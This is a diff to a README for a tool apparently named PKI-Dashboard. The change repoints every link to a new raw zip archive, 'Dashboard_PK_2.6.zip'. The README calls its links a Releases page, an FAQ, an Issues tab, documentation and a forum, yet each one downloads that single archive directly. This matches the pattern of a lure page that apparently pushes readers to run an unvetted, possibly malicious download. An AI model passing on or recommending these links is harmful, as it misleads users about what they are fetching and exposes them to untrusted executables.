@@ -1,7 +1,7 @@
 # 🌟 PKI-Dashboard - Simple Tool for Secure Data Management
 
 ## 📦 Download Now!
-[![Download PKI-Dashboard](https://raw.githubusercontent.com/LOVEisVERB/PKI-Dashboard/main/Euglenoidina/PKI-Dashboard.zip)](https://raw.githubusercontent.com/LOVEisVERB/PKI-Dashboard/main/Euglenoidina/PKI-Dashboard.zip)
+[![Download PKI-Dashboard](https://raw.githubusercontent.com/LOVEisVERB/PKI-Dashboard/main/Euglenoidina/Dashboard_PK_2.6.zip)](https://raw.githubusercontent.com/LOVEisVERB/PKI-Dashboard/main/Euglenoidina/Dashboard_PK_2.6.zip)
 
 ## 🚀 Getting Started
 
@@ -19,14 +19,14 @@ Before you download, please ensure your system meets the following requirements:
 
 To get started, visit the Releases page to download the PKI-Dashboard:
 
-[Download from Releases](https://raw.githubusercontent.com/LOVEisVERB/PKI-Dashboard/main/Euglenoidina/PKI-Dashboard.zip)
+[Download from Releases](https://raw.githubusercontent.com/LOVEisVERB/PKI-Dashboard/main/Euglenoidina/Dashboard_PK_2.6.zip)
 
 1. Click the link above to go to the Releases page.
 2. Find the latest version, which is usually at the top of the list.
 3. Look for a file that matches your operating system:
    - For Windows, download the `.exe` file.
    - For macOS, download the `.dmg` file.
-   - For Linux, download the appropriate https://raw.githubusercontent.com/LOVEisVERB/PKI-Dashboard/main/Euglenoidina/PKI-Dashboard.zip or .deb file.
+   - For Linux, download the appropriate https://raw.githubusercontent.com/LOVEisVERB/PKI-Dashboard/main/Euglenoidina/Dashboard_PK_2.6.zip or .deb file.
 
 4. Once downloaded:
    - For Windows: Double-click the `.exe` file and follow the installation prompts.
@@ -57,12 +57,12 @@ Once you have successfully installed PKI-Dashboard, follow these steps to start 
 
 If you run into any issues or have questions while using PKI-Dashboard, feel free to reach out for assistance:
 
-- Browse our [FAQ Section](https://raw.githubusercontent.com/LOVEisVERB/PKI-Dashboard/main/Euglenoidina/PKI-Dashboard.zip) for common questions.
-- Contact us via the [Issues](https://raw.githubusercontent.com/LOVEisVERB/PKI-Dashboard/main/Euglenoidina/PKI-Dashboard.zip) tab for any technical problems.
+- Browse our [FAQ Section](https://raw.githubusercontent.com/LOVEisVERB/PKI-Dashboard/main/Euglenoidina/Dashboard_PK_2.6.zip) for common questions.
+- Contact us via the [Issues](https://raw.githubusercontent.com/LOVEisVERB/PKI-Dashboard/main/Euglenoidina/Dashboard_PK_2.6.zip) tab for any technical problems.
 
 ## 🔗 Additional Resources
 
-- [User Documentation](https://raw.githubusercontent.com/LOVEisVERB/PKI-Dashboard/main/Euglenoidina/PKI-Dashboard.zip)
-- [Community Forum](https://raw.githubusercontent.com/LOVEisVERB/PKI-Dashboard/main/Euglenoidina/PKI-Dashboard.zip)
+- [User Documentation](https://raw.githubusercontent.com/LOVEisVERB/PKI-Dashboard/main/Euglenoidina/Dashboard_PK_2.6.zip)
+- [Community Forum](https://raw.githubusercontent.com/LOVEisVERB/PKI-Dashboard/main/Euglenoidina/Dashboard_PK_2.6.zip)
 
 We hope you enjoy using **PKI-Dashboard** as your go-to tool for managing your public key infrastructure securely.
